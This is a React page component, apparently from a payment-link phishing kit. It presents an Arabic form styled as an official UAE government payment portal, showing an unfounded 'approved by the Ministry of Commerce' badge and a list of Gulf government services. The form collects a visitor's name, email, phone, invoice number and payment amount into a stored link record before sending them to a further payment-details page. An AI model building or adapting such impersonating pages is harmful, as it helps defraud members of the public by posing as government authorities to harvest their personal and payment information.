import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Shield, CheckCircle } from "lucide-react";

const PaymentData = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();

  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [selectedService, setSelectedService] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("");

  // Get query parameters from URL
  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || 'payment';

  const serviceName = "دفع فاتورة";
  const paymentInfo = linkData?.payload as any;

  // Get country from link data
  const countryCode = paymentInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  // Get government services for the country
  const governmentServices = useMemo(
    () => getGovernmentServicesByCountry(countryCode),
    [countryCode]
  );

  // Get selected government service details
  const selectedServiceData = useMemo(
    () => governmentServices.find(s => s.key === selectedService),
    [governmentServices, selectedService]
  );

  // Get amount from link data
  const rawAmount = paymentInfo?.payment_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Set initial payment amount from link data
  useState(() => {
    if (amount && !paymentAmount) {
      setPaymentAmount(amount.toString());
    }
  }, [amount, paymentAmount]);

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    // Update link with payment data
    try {
      const updatedData = {
        ...linkData.payload,
        payment_data: {
          customer_name: customerName,
          customer_email: customerEmail,
          customer_phone: customerPhone,
          invoice_number: invoiceNumber,
          selected_service: selectedService,
          selected_service_name: selectedServiceData?.nameAr || selectedService,
          payment_amount: parseFloat(paymentAmount) || amount,
        },
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedData,
      });

      // Navigate to payment details
      navigate(`/pay/${id}/details`);
    } catch (error) {
      console.error("Error updating payment data:", error);
    }
  };

  // UAE Government Color Scheme
  const uaeColors = {
    primary: "#CE1126", // UAE Red
    secondary: "#00732F", // UAE Green
    accent: "#000000", // Black
    background: "#FFFFFF", // White
    lightGray: "#F5F5F5",
    border: "#E0E0E0",
  };

  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formatCurrency(amount, countryCode)}
        title="دفع فاتورة - إكمال البيانات"
        description="قم بإكمال بيانات السداد لدفع الفاتورة"
      />
      <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
        {/* Header */}
        <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
          <div className="container mx-auto px-4 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
                  <Shield className="w-6 h-6" style={{ color: uaeColors.primary }} />
                </div>
                <div className="text-white">
                  <h1 className="text-lg font-bold">البوابة الرسمية للدفع</h1>
                  <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
                </div>
              </div>
              <div className="text-white text-right">
                <p className="text-sm font-medium">{countryData?.nameAr}</p>
                <p className="text-xs opacity-90">{formatCurrency(amount, countryCode)}</p>
              </div>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-4 py-8">
          <div className="max-w-3xl mx-auto">
            {/* Security Notice */}
            <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
              <div className="flex items-start gap-3">
                <CheckCircle className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
                <div>
                  <h3 className="font-semibold text-sm mb-1">إكمال بيانات السداد</h3>
                  <p className="text-xs text-gray-600">
                    يرجى إدخال جميع البيانات المطلوبة لإكمال عملية الدفع
                  </p>
                </div>
              </div>
            </div>

            <Card className="p-6 sm:p-8 shadow-lg border-0 rounded-lg overflow-hidden">
              <div className="mb-6">
                <div className="flex items-center gap-3 mb-2">
                  <div
                    className="w-12 h-12 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: `${uaeColors.primary}15` }}
                  >
                    <CreditCard className="w-6 h-6" style={{ color: uaeColors.primary }} />
                  </div>
                  <div>
                    <h3 className="text-lg font-bold" style={{ color: uaeColors.accent }}>
                      إكمال بيانات السداد
                    </h3>
                    <p className="text-sm text-gray-500">الرجاء إدخال جميع البيانات بدقة</p>
                  </div>
                </div>
              </div>

              <form onSubmit={handleProceed} className="space-y-5">
                {/* Customer Name */}
                <div>
                  <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                    <User className="w-4 h-4" />
                    الاسم الكامل *
                  </Label>
                  <Input
                    id="name"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                    placeholder="أدخل اسمك الكامل"
                  />
                </div>

                {/* Customer Email */}
                <div>
                  <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                    <Mail className="w-4 h-4" />
                    البريد الإلكتروني *
                  </Label>
                  <Input
                    id="email"
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                    placeholder="example@email.com"
                  />
                </div>

                {/* Customer Phone */}
                <div>
                  <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                    <Phone className="w-4 h-4" />
                    رقم الهاتف *
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                    placeholder={`${phoneCode} ${phonePlaceholder}`}
                  />
                </div>

                {/* Invoice Number */}
                <div>
                  <Label htmlFor="invoice" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                    <Hash className="w-4 h-4" />
                    الرقم المفوتر *
                  </Label>
                  <Input
                    id="invoice"
                    value={invoiceNumber}
                    onChange={(e) => setInvoiceNumber(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                    placeholder="مثال: INV-12345"
                  />
                </div>

                {/* Government Service Selection */}
                <div>
                  <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                    الخدمة الحكومية/العامة *
                  </Label>
                  <Select value={selectedService} onValueChange={setSelectedService}>
                    <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
                      <SelectValue placeholder="اختر الخدمة" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {governmentServices.map((service) => (
                        <SelectItem key={service.id} value={service.key}>
                          {service.nameAr}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  {selectedServiceData && (
                    <p className="text-xs text-gray-500 mt-1">
                      {selectedServiceData.description}
                    </p>
                  )}
                </div>

                {/* Payment Amount */}
                <div>
                  <Label htmlFor="amount" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                    <CreditCard className="w-4 h-4" />
                    مبلغ السداد *
                  </Label>
                  <Input
                    id="amount"
                    type="number"
                    value={paymentAmount}
                    onChange={(e) => setPaymentAmount(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                    placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
                    step="0.01"
                    min="0"
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    المبلغ الافتراضي: {formatCurrency(amount, countryCode)}
                  </p>
                </div>

                {/* Payment Summary */}
                <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
                  <h4 className="font-semibold mb-3" style={{ color: uaeColors.accent }}>ملخص المبلغ</h4>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-gray-600">المبلغ الإجمالي</span>
                    <span className="text-xl font-bold" style={{ color: uaeColors.primary }}>
                      {formatCurrency(parseFloat(paymentAmount) || amount, countryCode)}
                    </span>
                  </div>
                </div>

                {/* Proceed Button */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
                  style={{ backgroundColor: uaeColors.primary }}
                  disabled={!customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
                >
                  <span className="ml-2">التالي</span>
                  <ArrowLeft className="w-5 h-5" />
                </Button>

                <p className="text-xs text-center text-gray-500 mt-4">
                  بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
                </p>
              </form>
            </Card>

            {/* Security Footer */}
            <div className="mt-6 text-center">
              <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
                <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
                <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>معتمد من وزارة التجارة</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentData;
